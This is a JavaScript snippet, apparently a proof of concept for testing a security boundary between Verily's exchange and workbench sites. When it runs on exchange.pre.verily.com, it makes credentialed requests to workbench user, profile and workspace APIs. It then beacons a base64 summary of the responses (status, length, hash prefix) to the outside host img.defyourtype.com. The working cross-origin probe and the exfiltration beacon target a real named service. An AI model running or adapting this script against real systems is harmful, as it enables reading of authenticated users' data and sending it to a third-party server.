(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;
  if (window.__exchangeWorkbenchBoundary) return;

  const marker = "cedar-bridge-41c2";
  const targets = [
    {
      name: "user-self",
      url: "https://workbench.verily.com/api/user/api/organizations/v2/users/self",
      options: { method: "GET", credentials: "include" },
    },
    {
      name: "user-profile",
      url: "https://workbench.verily.com/api/user/api/profile",
      options: { method: "GET", credentials: "include" },
    },
    {
      name: "wsm-profile",
      url: "https://workbench.verily.com/api/wsm/api/profile",
      options: { method: "GET", credentials: "include" },
    },
    {
      name: "workspace-filter",
      url: "https://workbench.verily.com/api/wsm/api/workspaces/v2/filtered",
      options: {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "text/plain" },
        body: "{\"limit\":1,\"offset\":0,\"minimumHighestRole\":\"READER\"}",
      },
    },
  ];

  const result = {
    marker,
    origin: location.origin,
    title: document.title,
    targets: {},
  };
  window.__exchangeWorkbenchBoundary = result;

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  const run = async ({ name, url, options }) => {
    try {
      const response = await fetch(url, options);
      const body = await response.text();
      result.targets[name] = {
        readable: true,
        status: response.status,
        type: response.headers.get("content-type") || "",
        length: body.length,
        hashPrefix: await digestPrefix(body),
      };
    } catch (error) {
      result.targets[name] = {
        readable: false,
        error: error?.name || "Error",
      };
    }
  };

  Promise.all(targets.map(run)).then(() => {
    const summary = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
    fetch(
      `https://img.defyourtype.com/r/cedar-bridge-41c2.gif?summary=${encodeURIComponent(summary)}`,
      { mode: "no-cors", credentials: "omit", keepalive: true },
    ).catch(() => {});
  });
})();
